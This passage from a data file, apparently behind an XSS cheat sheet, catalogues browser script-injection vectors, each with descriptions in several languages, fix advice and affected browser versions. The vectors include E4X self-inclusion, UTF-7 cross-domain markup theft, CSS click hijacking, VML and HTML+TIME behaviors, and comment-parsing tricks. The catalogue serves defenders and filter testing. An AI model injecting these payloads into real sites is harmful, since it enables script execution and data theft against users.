            'internet explorer': ['5.5', '6.0', '7.0', '8.0', 'end']
        },
        'tags'       : ['xss', 'javascript', 'ie', 'behavior', 'html+time', 'attributename', 'to', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 25 - Self-including E4X-based JavaScript snippet  */
        'id'         : 25,
        'category'   : 'e4x', 
        'name'       : {
            'en' : 'Self-including E4X-based JavaScript snippet',
            'ja' : '',
            'ru' : 'Самовключаемый JavaScript фрагмент, основанный на E4X',
            'cs' : 'Automaticky vykonaný kód založený na E4X',
            'de' : '',
            'tr' : 'Kendiliğinden varolan E4X tabanlı Javascript kod parçaları'
        },
        'data'       : '<script src="#">{%js_alert%}</script>;1',
        'description': {
            'en' : 'This <SCRIPT> tag tries to include the very same page it is being executed from - and then executes the {}-delimited E4X payload. To avoid having Firefox throw an error during inclusion the ending sequence ;0 is necessary.',
            'ja' : '',
            'ru' : 'Этот тег <SCRIPT> пытается использовать ту же самую страницу в качестве своего содержимого. Если содержимое страницы правильно с точки зрения XML-синтаксиса, она будет разобрана в JavaScript в качестве E4X-строки. При этом произойдет выполнение полезной нагрузки, содержащейся внутри E4X-разделителя - {}. Чтобы избежать возможную ошибку во время включения, необходимо окончание в виде ;0 и т.п.',
            'cs' : 'Tento tag SCRIPT se pokouší vložit tutéž stránku, v níž je obsažen, a vykonat skript uzavřený do E4X {}. Koncová sekvence ;1 je použita proto, aby Firefox nevyhodil při vkládání chybu.',
            'de' : '',
            'tr' : 'Bu <SCRIPT> tagı çalıştırılacağı aynı sayfayı yüklemeye çalışıyor ve başarılı olursa {} arasında E4X payload\'unu çalıştırıyor. Firefox\'un dahil etme sırasında hata yakalamasından kaçınmak için ;0 gereklidir.'
        },
        'urls'    : ['https://developer.mozilla.org/en/E4X'],
        'howtofix'   : {
            'en' : 'E4X is extremely dangerous since any page can include sources providing valid XML and the mentioned semi-colon delimiter. For effective protection websites must be applied with a DOCTYPE - or contain invalid markup. There are many variations for the ending delimiter - as long it is valid JavaScript and not indicating the page is XML only it will work (;1, ,1, ._, etc..)',
            'ja' : '',
            'ru' : 'E4X является чрезвычайно опасным, если исходный код страницы является правильным с т.зр. XML и содержит разделители в виде точек с запятой. Для эффективной защиты сайты должны применять DOCTYPE или содержать неправильную разметку. Существует много вариантов для оканчивающего разделителя: если это правильный JavaScript, и страница не является исключительно XML, то будут работать ";1", ",1", "._" и т.д.',
            'cs' : 'E4X je extrémně nebezpečný, pokud může libovolná stránka vložit libovolné validní XML a zmíněný středník jako omezovač. Efektivní ochrana spočívá ve správném DOCTYPE - nebo v nevalidním zápisu. Existuje mnohjo variant koncového omezovače - dokud to bude platný JavaScript a stránka nebude naznačovat, že je XML-only, bude to fungovat (;1, ,1, ._, atd.)',
            'de' : '',
            'tr' : 'E4X geçerli XML ve sözü edilen noktalı vigül ayraçı içeren herhangi bir sayfa dahil edildiğinde tamamen tehlikeli olabilmekte. İşe yarar bir korunma için websiteleri mutlaka DOCTYPE ile uygulanmalıdır. Bitirici ayraçların birçok varyasyonları var - ki herbiri geçerli birer JavaScript olup belirtilen XML sayfa sayfası değil belirteç çalışacaktır (;1, ,1, ._, etc..)'
        },            
        'browsers'   : {
            'firefox' : ['1.5', '2.0', '3.0', '4.0', '15.0']
        },
        'tags'       : ['xss', 'javascript', 'firefox', 'e4x', 'self-inclusion', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 26 - E4X-based UTF-7 JavaScript snippet stealing cross-domain markup  */
        'id'         : 26,
        'category'   : 'e4x', 
        'name'       : {
            'en' : 'E4X-based UTF-7 JavaScript/HTML snippet stealing cross-domain markup',
            'ja' : '',
            'ru' : 'Кодированный UTF-7 JavaScript/HTML фрагмент на основе E4X для междоменного доступа к разметке',
            'cs' : 'Kód v JS/HTML, využívající UTF-7 a E4X ke cross-domain přístupu k HTML',
            'de' : '',
            'tr' : 'E4X tabanlı UTF-7 JavaScript/HTML kod parçası ile "cross-domain" etiket çalma'
        },
        'data'       : '+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),%js_alert_only%(RegExp.input);',
        'description': {
            'en' : 'In case an attacker can inject the character sequence beginning with .toXMLString() it\'s possible to include the victimized website in a <SCRIPT> tag loaded from an arbitrary page and steal the markup of the included page - across domain and protocol borders. Note that the whole vector is encoded in UTF-7. This is possible since the including <SCRIPT> tag can decide via charset attribute what charset to use.',
            'ja' : '',
            'ru' : 'В случае, если атакующий может внедрить последовательность символов, начинающихся с .toXMLString(), существует возможность включения уязвимого сайта в качестве содержимого тега <SCRIPT>, запускаемого с удаленной страницы, с последующим присвоением разметки включенной страницы независимо от протокола и домена. Обратите внимание, что весь вектор кодируется в UTF-7. Это возможно, поскольку в теге <SCRIPT> можно указать кодировку с помощью атрибута charset.',
            'cs' : 'Pokud může útočník vložit sekvenci znaků začínající .toXMLString(), může tak vložit stránku do tagu SCRIPT v běžné stránce a získat tak plný přístup k DOM vložené stránky - napříč doménami a protokoly. Všimněte si, že celý škodlivý skript je zapsán v UTF-7. To je možné proto, že tag SCRIPT může pomocí atributu charset určit znakovou sadu, která bude použita.',
            'de' : '',
            'tr' : 'Bu durumda saldırgan .toXMLString() ile başlayan bir kelime enjekte edebilir, hedef alınılan siteyi harici bir sayfadan yüklenen <SCRIPT> tagı ile dahil etmeyi ve aynı sayfadaki markup\'ı çalmak mümkün olabilmektedir - domain ve protokol sınırları içerisinde. Not olarak, atak vektörü UTF-7 ile kodlanmıştır. Hangi karakter setinin kullanılacağına <SCRIPT> tagının karar verebiliyor olması UTF-7 ile kodlanmış atak vektörünü mümkün kılmakta.'
        },
        'urls'    : ['https://developer.mozilla.org/en/E4X'],
        'howtofix'   : {
            'en' : 'Make sure all sites are being applied with a defined charset like UTF-8. Also incoming data should be converted from UTF-7 before being escaped with htmlentities() or comparable methods. All websites containing sensitive data should be applied with a DOCTYPE.',
            'ja' : '',
            'ru' : 'Убедитесь, что ко всем страницам применяется определенная UTF-8 кодировка. Кроме того, входящие данные должны быть преобразованы из UTF-7, прежде чем будут обработаны с помощью htmlentities() или похожих методов. Все страницы, содержащие конфиденциальные данные, должны использовать DOCTYPE.',
            'cs' : 'Ujistěte se, že všechny stránky mají definovanou znakovou sadu, např. UTF-8. Stejně tak převeďte vstupní data z UTF-7 před jejich ošetřením pomocí metod jako htmlentities(). Všechny webové stránky, obsahující citlivá data, by měly mít uvedený DOCTYPE.',
            'de' : '',
            'tr' : 'Tüm sitelere tanımlanmış karakter setlerinin (UTF-8 gibi mesela) uygulandığından emin olun. Ayrıca gelen veri htmlentities() veya benzeri metotlar ile denetlenmeden önce UTF-7\'den mevcut karakter setine dönüştürülmelidir. Ayrıca önemli veriler içeren tüm web sitelerine DOCTYPE uygulanmalıdır.'
        },            
        'browsers'   : {
            'firefox' : ['1.5', '2.0', '3.0', '4.0', '4.0.1', 'end']
        },
        'tags'       : ['xss', 'javascript', 'firefox', 'e4x', 'stealing', 'utf7', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 27 - Opera whole-page click hijacking via CSS  */
        'id'         : 27,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Opera whole-page click hijacking via CSS',
            'ja' : '',
            'ru' : 'Перехват нажатия на любом теге страницы с помощью CSS для Opera',
            'cs' : 'Click hijack celé stránky v Opeře pomocí CSS',
            'de' : '',
            'tr' : 'Opera\'da CSS ile click hijacking'
        },
        'data'       : '<style>p[foo=bar{}*{-o-link:\'%js_uri_alert%\'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>',
        'trigger'    : 'location=getComputedStyle(frames[1].document.body, null).OLink.slice(1, -1)',
        'description': {
            'en' : 'Opera as well as other browsers allow to break out attribute selectors and other CSS constructs with {...} - opening the possibility for declaring new properties and assigning values - such as -o-link and -o-link-source. In this case those proprietary properties allow overlaying any selected element with a JavaScript URI link href. Note that as of Opera 11 -o-link only applies for <a> tags.\r\nOn IE selector is broken up to IE 7 standards mode.',
            'ja' : '',
            'ru' : 'Opera, как и другие браузеры, допускают выход за пределы селектора и других CSS-конструкций с помощью {...}, что открывает возможность для декларирования новых свойств и их значений, создавая видимость продолжения селектора.\r\nВ IE селектор прерывается вплоть до режима стандартов IE 7.',
            'cs' : 'Opera, podobně jako další prohlížeče, umožňuje vložit do selektorů a dalších míst složené konstrukce s {...}, což umožňuje deklarovat nové vlastnosti a přiřadit jim hodnoty, jako -o-link a -o-link-source. V tomto případě tyto proprietární vlastnosti mohou přiřadit libovolnému HTML elementu odkaz, který obsahuje JavaScript URI',
            'de' : '',
            'tr' : 'Diğer browserlar gibi Opera\'da özellik seçicilerini ve {...} ile başlayan diğer CSS constructer\'larını kötü amaçta kullanmaya izin veriyor - yeni özellikler tanımlanması ve değer atanmasının olasılığınıda arttırıyor - ayrıca -o-link -o-link-source gibi özellik seçicilerinede. Bu atak vektöründe bu özellikler JavaScript URI link href\'i ile seçilen herhangi bir elementin üstüne yazmaya izin veriyor. '
        },
        'urls'    : ['http://www.aptana.com/reference/html/api/CSS.field.-o-link-source.html', '#9'],
        'howtofix'   : {
            'en' : 'In case users are allowed to submit CSS make sure the properties allowed are whitelisted and attribute selector content does not allow the combination {...} because it breaks out the attribute selector and allows declaration of new properties.',
            'ja' : '',
            'ru' : 'В случае, если пользователи имеют возможность изменять CSS, убедитесь, что свойства занесены в "белый список", а селекторы не содержат сочетание {...} .',
            'cs' : 'V případě, že mají uživatelé povoleno vkládat CSS, použijte whitelist povolených vlastností. Rovněž se ujistěte, že selektor nedovoluje zapsání {...}, protože tím je možno přerušit zápis selektoru a vytvořit deklaraci nové vlastnosti.',
            'de' : ''
        },            
        'browsers'   : {
            'opera': ['8.x', '9.0', '10.0', '11.0', '11.64', 'end', 'mobile'],
            'internet explorer': ['6.0', '7.0', '8.0', '9.0', '10.0'],
            'chrome': ['7.0', '23.0'],
            'safari': ['4.0', '5.0', '5.1.7']  
        },
        'tags'       : ['xss', 'javascript', 'css', 'opera', 'attribute selectors', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 28 - JavaScript execution via HTML+TIME without user interaction (2)  */
        'id'         : 28,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'JavaScript execution via HTML+TIME without user interaction (2)',
            'ja' : '',
            'ru' : 'Активный скриптинг с применением технологии HTML+TIME (2)  ',
            'cs' : 'Vykonání JavaScriptu via HTML+TIME bez uživatelské interakce (2)',
            'de' : ''
        },
        'data'       : '1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=%js_alert%&gt;>',
        'description': {
            'en' : 'This HTML+TIME vector utilized the attributes "attributename" and "values" to map encoded markup into an attribute to execute JavaScript.',
            'ja' : '',
            'ru' : 'Этот HTML+TIME вектор использует атрибуты attributename и values для изменения значения свойства innerHTML у анимируемого объекта. Нужно иметь в виду, что посредством тегов set и animate можно менять и другие свойства объектов (например, src или href). Отличие animate от set состоит в том, что анимировать возможно только то свойство, которое уже имеет начальное значение. Если свойство не имеет начальное значение, то можно прибегнуть к использованию сочетания атрибутов from и to в теге animate.',
            'cs' : 'Tento útok používá atributy "attributename" a "values" k namapování kódovaného HTML do atributu.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'As soon as the HTML+TIME namespace and the behavior property are mapped to a HTML element a whole range of new attributes to execute JavaScript is available. In user submitted html "xmlns" attributes should not be allowed - as well as "behavior" properties for style tags and attribtes. Don\'t rely on blacklisting when dealing with user submitted markup.',
            'ja' : '',
            'ru' : 'Как только пространство имен и поведение HTML+TIME привязаны к тегу, становятся доступными целый ряд новых атрибутов, с помощью которых возможно выполнение JavaScript. В пользовательской разметке не должно быть разрешено использование атрибута xmlns, а также свойств поведений в стилях. Избегайте черных списков при работе с пользовательской разметкой.',
            'cs' : 'Pokud je možné namapovat HTML+TIME namespace a vlastnost behavior některému HTML elementu, lze využít širokou škálu atributů k provedení JavaScriptu. Neměli byste povolit atributy "xmlns" v uživatelsky vkládaném HTML, stejně jako vlastnost "behavior". Nespoléhejte na blacklisty, když pracujete s uživatelsky vloženým HTML.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', 'end']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'behavior', 'style', 'html+time', 'attributename', 'values', 'proprietary'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 29 - JavaScript execution via <LINK> href attribute and data URI  */
        'id'         : 29,
        'category'   : 'css', 
        'name'       : {
            'en' : 'JavaScript execution via <LINK> href attribute and data URI',
            'ja' : '',
            'ru' : 'Выполнение JavaScript с помощью атрибута href и data URI в теге <LINK>',
            'cs' : 'Vykonání JavaScriptu pomocí href atributu u LINK a data URI',
            'de' : ''
        },
        'data'       : '<link rel=stylesheet href=data:,*%7bx:expression(%js_write%)%7d',
        'description': {
            'en' : 'Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a <LINK> tag. The example works up to IE 7 standards mode.',
            'ja' : '',
            'ru' : 'Несмотря на имеющуюся документацию Internet Explorer 8 поддерживает схему data URI не только для вывода изображений, но также и для представления стилевой информации. Это может быть использовано для сокрытия expression() внутри data URI и вызова JavaScript в теге <LINK>. Пример будет работать вплоть до режима стандартов IE 7.',
            'cs' : 'Podle existující dokumentace k IE8 jsou datová URI podporována nejen pro zobrazení obrázků, ale i pro stylopis. To může být zneužito pro vložení expression() do datového URI a k vykonání skriptu v tagu LINK.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure stylesheet URIs cannot be controlled by the user - and user submitted  <LINK> tags will not be displayed unfiltered.',
            'ja' : '',
            'ru' : 'Убедитесь, что стилевые URI не могут быть в полной мере подконтрольны пользователю, а пользовательские теги LINK не выводятся неотфильтрованными.',
            'cs' : 'Ujistěte se, že URI pro stylopis nemůže uživatel ovlivnit, a uživatelem zadané tagy LINK nezobrazujte bez kontroly a filtrování.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['8.0', '9.0', '10.0']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'css', 'style', 'expression', 'datauri', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 30 - JavaScript execution via <STYLE> @import and data URI  */
        'id'         : 30,
        'category'   : 'css', 
        'name'       : {
            'en' : 'JavaScript execution via <STYLE> @import and data URI',
            'ja' : 'Выполнение JavaScript с помощью @import и data URI в теге <STYLE>',
            'ru' : '',
            'cs' : 'Vykonání JavaScriptu pomocí @import a data URI',
            'de' : ''
        },
        'data'       : '<style>@import "data:,*%7bx:expression(%js_write%)%7D";</style>',
        'description': {
            'en' : 'Despite the existing documentation Internet Explorer 8 supports data URIs not only for displaying images but also supplying stylesheet information. This can be used to wrap expression() CSS into a data URI and execute JavaScript with a <STYLE> @import directive. The example works up to IE 7 standards mode.',
            'ja' : '',
            'ru' : 'Несмотря на имеющуюся документацию Internet Explorer 8 поддерживает схему data URI не только для вывода изображений, но также и для представления стилевой информации. Это может быть использовано для сокрытия expression() внутри data URI и вызова JavaScript c помощью директивы @import тега <STYLE>. Пример будет работать вплоть до режима стандартов IE 7.',
            'cs' : 'Podle existující dokumentace k IE8 jsou datová URI podporována nejen pro zobrazení obrázků, ale i pro stylopis. To může být zneužito pro vložení expression() do datového URI a k vykonání skriptu ve stylopisu pomocí @import.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms530768%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Make sure stylesheet URIs cannot be controlled by the user - and user submitted  <STYLE> cannot contain the @import directive.',
            'ja' : '',
            'ru' : 'Убедитесь, что стилевые URI не могут быть в полной мере подконтрольны пользователю, а пользовательские стили не содержат директиву @import.',
            'cs' : 'Ujistěte se, že URI pro stylopis nemůže uživatel ovlivnit, a že případné uživatelem zadané styly neobsahují @import.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['8.0', '9.0', '10.0']
        },
        'tags'       : ['xss', 'javascript', 'internet explorer', 'css', 'style', 'expression', 'datauri', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 31 - JavaScript execution via <FRAMESET> and onload  */
        'id'         : 31,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <FRAMESET> and onload',
            'ja' : '',
            'ru' : 'Выполнение JavaScript с помощью <FRAMESET> и onload',
            'cs' : 'Vykonání JavaScriptu pomocí FRAMESET a onload',
            'de' : ''
        },
        'data'       : '<frameset onload=%js_alert%>',
        'description': {
            'en' : 'This classic vector shows that several tags don\'t need a "src" attribute to fire onload events, such as <IFRAME>, <BODY> and <FRAMESET>.',
            'ja' : '',
            'ru' : 'Этот классический вектор демонстрирует, что некоторые теги (такие, как <IFRAME>, <BODY> и <FRAMESET>) не требуют атрибута src для запуска обработчика onload.',
            'cs' : 'Klasický způsob útoku, který využívá tagy, jenž nepotřebují atribut "src" k vyvolání události load, jako IFRAME, BODY a FRAMESET.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Be sure to work with whitelists when allowing users to submit markup - else ancient tags like <FRAMESET> might be forgotten to filter and escape.',
            'ja' : '',
            'ru' : 'Убедитесь, что работаете с белым списком, когда принимаете пользовательскую разметку, в ином случае такие устаревшие теги, как <FRAMESET>, могут быть упущены из внимания при фильтрации.',
            'cs' : 'Pro jistotu filtrujte uživatelsky vložené HTML whitelistem - prastaré tagy jako FRAMESET mohou být při běžném filtrování opomenuty.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
            'opera': ['8.x', '9.0', '10.0', '11.0', '12.0', 'mobile'], 
            'firefox' : ['1.x', '2.0', '3.0', '4.0', '15.0'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari': ['3.0', '4.0', '5.0', '5.1.7']
        },
        'tags'       : ['xss', 'javascript', 'frames', 'classic', 'html', 'onload'],
        'reporter'   : '.mario'
    },
    { /* ID 32 - JavaScript execution via <TABLE> and background  */
        'id'         : 32,
        'category'   : 'html', 
        'name'       : {
            'en' : 'JavaScript execution via <TABLE> and background',
            'ja' : '',
            'ru' : 'Выполнение JavaScript с помощью <TABLE> и background',
            'cs' : 'Vykonání JavaScriptu pomocí TABLE a background',
            'de' : ''
        },
        'data'       : '<table background="javascript:%js_alert%"></table>',
        'description': {
            'en' : 'Opera 8-10.5+ as well as Internet Explorer 6 support JavaScript URIs for <TABLE> and some other tags\' "background" attributes. This causes JavaScript execution without user interaction. The problem has been fixed in Opera 11.',
            'ja' : '',
            'ru' : 'Opera 8-10.5+ , а также Internet Explorer 6 поддерживают псевдоскрипт в теге <TABLE> и некоторых других тегах в атрибуте background. Это открывает возможность выполнения JavaScript без участия пользователя.',
            'cs' : 'Opera 8-10.5+, stejně jako IE6, podporují JS URI pro atribut "background" u tagů jako TABLE. Skript se tak spustí bez zásahu uživatele.',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'In case evil attributes like event handlers are being filtered from user submitted markup make sure not to forget "background" - among others.',
            'ja' : '',
            'ru' : 'Убедитесь, что при фильтрации пользовательской разметки среди прочих не забыт и атрибут background.',
            'cs' : 'Pokud už filtrujete "zlé" atributy jako obsluhu událostí z uživatelsky zadaného HTML, nezapomeňte na "background" - mezi jinými.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['6.0', 'end'],
            'opera': ['8.x', '9.0', '10.0', '11.01', 'end', 'mobile'] 
        },
        'tags'       : ['xss', 'javascript', 'background', 'classic', 'html', 'table'],
        'reporter'   : '.mario'
    },
    { /* ID 33 - Breaking pointer-events:none with nested links  */
        'id'         : 33,
        'category'   : 'css', 
        'name'       : {
            'en' : 'Breaking pointer-events:none with nested links',
            'ja' : '',
            'ru' : 'Прерывание pointer-events:none вложенной ссылкой',
            'cs' : 'Prolomení pointer-events:none vloženými odkazy',
            'de' : ''
        },
        'data'       : '<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="%js_alert%;">XXX</a></a><a href="%js_uri_alert_2%">XXX</a>',
        'trigger'    : 'l=document.getElementsByTagName("a");if(l[1].parentNode!=l[0])l[1].onclick();',
        'description': {
            'en' : 'Firefox 3.6+ allows using CSS "pointer-events"  with value "none" to make sure an element will not react on any mouse/pointer based event. This feature enables for example placing a DIV over another DIV without blocking the click events addressed to the underlying DIV.',
            'ja' : '',
            'ru' : 'Firefox 3.6+ позволяет использовать CSS-свойство pointer-events со значением none, чтобы элемент не реагировал на какие-либо события указателей. Это свойство позволяет, например, позиционировать элемент DIV поверх другого DIV без блокировки событий нажатия, адресованных нижнему. Измените вложенный тег <a> на какой-либо другой контейнерный тег, чтобы увидеть ожидаемое поведение pointer-events:none .',
            'cs' : 'Firefox 3.6+ umožňuje použít CSS vlastnost "pointer-events" s hodnotou "none" k tomu, aby element nereagoval na události vyvolané myší nebo kurzorem. Tato funkce umožňuje např. překrýt DIVem jiný DIV, aniž by překrývající blokoval události, adresované překrytému.',
            'de' : ''
        },
        'urls'    : ['http://hacks.mozilla.org/2009/12/pointer-events-for-html-in-firefox-3-6/'],
        'howtofix'   : {
            'en' : 'The feature breaks as soon as <A> elements are being used in combination with "pointer-events:none" - containing other <A> elements. <A> elements should not be used for pointer-event logic at all - especially not when containing user controlled HTML.',
            'ja' : '',
            'ru' : 'Свойство прерывается, как только тег <A>, используемый в сочетании с pointer-events:none, содержит другой тег <A>. Теги <A> не должны использоваться в логике pointer-events в целом, и в особенности тогда, когда они могут содержать контролируемую пользователем разметку.',
            'cs' : 'Toto nastavení je prolomeno, pokud je použito spolu s elementem <A>, ve kterém je vložený jiný <A>. Element <A> by neměl být takto používán vůbec - obzvlášť ne v případech, kdy může obsahovat uživatelsky vložené HTML.',
            'de' : ''
        },            
        'browsers'   : {
            'firefox': ['3.6', '4.0', '15.0'], 
            'safari' : ['5.0', '5.1.7'],
            'chrome' : ['7.0', '8.0', '9.0', '10.0', '23.0']
        },
        'tags'       : ['xss', 'hijacking', 'css', 'pointer-events', 'firefox', 'safari', 'chrome'],
        'reporter'   : '.mario'
    },
    { /* ID 34 - VML frame with embedded VML object plus onmouseover  */
        'id'         : 34,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'VML frame with embedded VML object plus onmouseover',
            'ja' : '',
            'ru' : 'VML фрейм с помещенным в него VML объектом плюс onmouseover',
            'cs' : 'VML rámec s vloženým VML objektem plus onmouseover',
            'de' : ''
        },
        'data'       : '1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%vml_path%#xss></vmlframe>',
        'attachment' : {
            'required_mime' : '',
            'crossdomain'    : '1',            
            'path'          : '',
            'name'          : 'test.vml',
            'raw'           : '<xml>\r\n\t<rect style="height:100%;width:100%" id="xss" onmouseover="%js_alert%" strokecolor="white" strokeweight="2000px" filled="false" />\r\n</xml>'
        },
        'description': {
            'en' : 'A VML frame object works by giving the VML frame a "src" attribute and have it point to another VML object. A VML frame object in quirks mode can enclose a VML rect object or regular HTML which is responding to mouseover events.',
            'ja' : '',
            'ru' : 'Объект VML-фрейма ссылается в атрибуте src на другой VML-объект, который реагирует на событие движения мышью. В режиме совместимости VML-фрейм может непосредственно заключать в себе VML-rect объект или обычный HTML.', 
            'cs' : 'VML rámec pracuje s objektem vloženým pomocí "src", který odkazuje na jiný VML objekt. V quirks mode může obsahovat VML rámec objekt nebo regulerní HTML, které odpoví na mouseover událost.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/bb263900%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
            'ja' : '',
            'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки опасных HTML-тегов.',
            'cs' : 'Nedovolte vlastnost behavior v uživatelských stylech či HTML a nespoléhejte se na blacklisty, které filtrují "podezřelé tagy".',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0'] 
        },
        'tags'       : ['xss', 'javascript', 'style', 'behavior', 'vml', 'internet explorer', 'proprietary'],
        'reporter'   : 'http://www.malware.com'
    },
    { /* ID 35 - VML line object utilizing href attribute with JavaScript URI   */
        'id'         : 35,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'VML line object utilizing href attribute with JavaScript URI',
            'ja' : '',
            'ru' : 'VML объект line использует атрибут href c псевдоскриптом.',
            'cs' : 'VML objekt Line používá atribut href s JS URI',
            'de' : ''
        },
        'data'       : '1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=%js_uri_alert% strokecolor=white strokeweight=1000px from=0 to=1000 /></a>',
        'trigger'    : 'document.getElementsByTagName("line")[0].click()',
        'description': {
            'en' : 'The vector paints a very thick and wide line responding to clicks with JavaScript execution via JavaScript URI. Note that the actual URI is being masked in the status bar. During an overlay attack the victim will not know about the payload via status bar.',
            'ja' : '',
            'ru' : 'Данный вектор рисует очень длинную и широкую линию, нажатие на которую приведет к исполнению JavaScript. Обратите внимание, что псевдоскрипт маскируется в статусной строке, поэтому потерпевший не будет знать об истинной полезной нагрузке. Такой же эффект имеет место и в остальных графических VML-тегах.',
            'cs' : 'Ukázka nakreslí velmi širokou čáru, která odpoví na kliknutí vyvoláním JS URI. Všimněte si, že aktuální URI je maskováno.',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/bb229513%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
            'ja' : '',
            'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки опасных HTML-тегов.',
            'cs' : 'Nedovolte vlastnost behavior v uživatelských stylech či HTML a nespoléhejte se na blacklisty, které filtrují "podezřelé tagy".',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0'] 
        },
        'tags'       : ['xss', 'javascript', 'style', 'behavior', 'vml', 'internet explorer', 'proprietary'],
        'reporter'   : 'LeverOne'
    },
    { /* ID 36 - AnchorClick behavior enabling folder attribute as href replacement  */
        'id'         : 36,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'AnchorClick behavior enabling folder attribute as href replacement',
            'ja' : '',
            'ru' : 'Поведение AnchorClick',
            'cs' : 'AnchorClick behavior dovoluje použít atribut folder místo href',
            'de' : ''
        },
        'data'       : '<a style="behavior:url(#default#AnchorClick);" folder="%js_uri_alert%">XXX</a>',
        'description': {
            'en' : 'Using the AnchorClick behavior allows to use the "folder" attribute as replacement for a "href" attribute on <A> elements. This example works up to IE 8 standards mode.',
            'ja' : '',
            'ru' : 'Использование поведения AnchorClick позволяет заменить в теге <A> атрибут href атрибутом folder, содержащим полезную нагрузку. Этот пример работает вплоть до режима стандартов IE 8.',
            'cs' : 'AnchorClick behavior dovoluje použít atribut folder místo href v tagu A',
            'de' : ''
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms531414%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags.',
            'ja' : '',
            'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки опасных HTML-тегов.',
            'cs' : 'Nedovolte vlastnost behavior v uživatelských stylech či HTML a nespoléhejte se na blacklisty, které filtrují "podezřelé tagy".',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', '9.0'] 
        },
        'tags'       : ['xss', 'javascript', 'style', 'behavior', 'anchorclick', 'internet explorer', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 37 - HTML comment parsing issues (1)  */
        'id'         : 37,
        'category'   : 'html', 
        'name'       : {
            'en' : 'HTML comment parsing issues (1)',
            'ja' : '',
            'ru' : 'Разбор комментариев в HTML (1)',
            'cs' : 'Problém s parsováním HTML komentářů (1)',
            'de' : ''
        },
        'data'       : '<!--<img src="--><img src=x onerror=%js_alert%//">',
        'description': {
            'en' : 'This vector shows how comments are being parsed and what problems can arise in case user submitted HTML is allowed to contain comments.',
            'ja' : '',
            'ru' : 'Этот пример показывает, как в настоящее время разбираются комментарии, и какие проблемы могут возникнуть в случае, если пользовательская разметка может содержать комментарии.',
            'cs' : 'Tento příklad ukazuje, jak jsou parsovány komentáře a jaké problémy mohou nastat, když uživatel smí vložit HTML, které obsahuje komentáře',
            'de' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure comments are not allowed in user submitted html. The markup should be checked for security issues after comments have been stripped out - not before.',
            'ja' : '',
            'ru' : 'Убедитесь, что комментарии не разрешены в пользовательской разметке. Разметка должна проверяться для целей безопасности только после удаления комментариев, но не до того.',
            'cs' : 'Vyhoďte komentáře z vloženého kódu a kontrolujte nebezpečnost vždy až po tomto vyhození, ne před ním.',
            'de' : ''
        },            
        'browsers'   : {
            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0', '10.0'],
            'opera': ['8.0', '9.0', '10.0', '11.0', '12.0', 'mobile'], 
            'firefox' : ['1.0', '2.0', '3.0', '4.0', '15.0'], 
